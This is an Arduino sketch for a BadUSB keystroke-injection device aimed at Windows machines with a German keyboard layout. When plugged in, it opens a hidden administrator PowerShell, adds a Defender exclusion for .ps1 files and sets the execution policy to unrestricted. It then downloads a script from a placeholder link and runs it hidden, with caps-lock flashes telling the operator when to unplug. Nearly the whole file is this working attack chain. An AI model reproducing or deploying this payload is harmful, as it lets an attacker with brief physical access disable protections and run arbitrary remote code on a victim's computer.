#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Function to type strings with German layout
void typeStringDE(String s) {
  for (int i = 0; i < s.length(); i++) {
    char c = s.charAt(i);
    if (c >= 'a' && c <= 'z') {
      Keyboard.press(c);
      Keyboard.release(c);
    } else if (c >= 'A' && c <= 'Z') {
      Keyboard.press(KEY_LEFT_SHIFT);
      Keyboard.press(tolower(c));
      Keyboard.releaseAll();
    } else if (c >= '0' && c <= '9') {
      Keyboard.press(c);
      Keyboard.release(c);
    } else {
      switch (c) {
        case ' ':
          Keyboard.press(' ');
          Keyboard.release(' ');
          break;
        case '-':
          Keyboard.press(KEY_MINUS);
          Keyboard.release(KEY_MINUS);
          break;
        case '.':
          Keyboard.press('.');
          Keyboard.release('.');
          break;
        case ':':
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.press('.');
          Keyboard.releaseAll();
          break;
        case '/':
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.press('7');
          Keyboard.releaseAll();
          break;
        case '|':
          Keyboard.press(KEY_RIGHT_ALT);
          Keyboard.press(KEY_NON_US_100);  // Assuming KEY_NON_US_100 is < > | in German
          Keyboard.releaseAll();
          break;
        case '"':
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.press('2');
          Keyboard.releaseAll();
          break;
        default:
          // For other chars, assume direct
          Keyboard.press(c);
          Keyboard.release(c);
          break;
      }
    }
    delay(10);  // Small delay between chars
  }
}

void setup()
{
  // Start Keyboard and Mouse

  Keyboard.begin();

  delay(2500);

  // Windows + D = minimize all apps

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(500);

  // Start powershell as Admin

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  typeStringDE("powershell.exe -windowstyle hidden");

  delay(200);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();

  delay(150);

  typeKey(KEY_RETURN);

  delay(2000);

  //Go to Public Documents directory

  typeStringDE("cd C:");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  typeStringDE("Users");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  typeStringDE("Public");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  typeStringDE("Documents");

  typeKey(KEY_RETURN);

  //Add an exception for .ps1 files in antivirus

  typeStringDE("Add-MpPreference -ExclusionExtension ps1 -Force");

  typeKey(KEY_RETURN);

  //Disable script blocker

  typeStringDE("Set-ExecutionPolicy unrestricted -Force");

  typeKey(KEY_RETURN);

  //Download ps1 sript

  typeStringDE("wget LINK -OutFile startScript.ps1");

  typeKey(KEY_RETURN);

  delay(3500);

  //Start ps1 script

  typeStringDE("powershell.exe -noexit -windowstyle hidden -file startScript.ps1");

  typeKey(KEY_RETURN);

  // Make capslock flash to know when you can unplug the BadUSB

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(2000);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}